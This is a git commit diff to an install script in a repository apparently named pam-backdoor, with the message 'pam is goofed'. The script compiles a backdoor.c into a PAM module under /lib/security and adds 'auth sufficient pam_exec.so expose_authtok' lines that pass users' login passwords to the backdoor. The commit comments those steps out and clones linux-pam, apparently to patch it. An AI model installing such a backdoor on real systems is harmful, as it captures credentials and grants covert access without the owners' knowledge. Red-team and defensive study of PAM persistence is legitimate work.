399288fd8312d9f91f7983fcd7fa45cdae110b2c
Jack <62919016+JackDunfey@users.noreply.github.com>
2024-11-29 02:33:42 -0500

    pam is goofed

--- pam-backdoor/install.sh
+++ pam-backdoor/install.sh
@@ -1,9 +1,12 @@
-apt-get install libpam0g-dev
-mkdir -p /lib/security
-gcc -fPIC -shared -o /lib/security/backdoor.so backdoor.c -lpam -lpam_misc
+apt update
+apt install -y build-essential libpam0g-dev 
 
-# mkdir -p /usr/lib/x86_64-linux-gnu/security/
-# cat <<- 'EOF' > /usr/lib/x86_64-linux-gnu/security/rt_tok.sh
-auth sufficient pam_exec.so debug expose_authtok /usr/lib/x86_64-linux-gnu/security/backdoor.so
+git clone https://github.com/linux-pam/linux-pam.git
+# mkdir -p /lib/security
+# gcc -fPIC -shared -o /lib/security/backdoor.so backdoor.c -lpam -lpam_misc
 
-# auth sufficient pam_exec.so debug expose_authtok /usr/lib/x86_64-linux-gnu/security/rt_tok.sh
+# # mkdir -p /usr/lib/x86_64-linux-gnu/security/
+# # cat <<- 'EOF' > /usr/lib/x86_64-linux-gnu/security/rt_tok.sh
+# auth sufficient pam_exec.so debug expose_authtok /usr/lib/x86_64-linux-gnu/security/backdoor.so
+
+# # auth sufficient pam_exec.so debug expose_authtok /usr/lib/x86_64-linux-gnu/security/rt_tok.sh
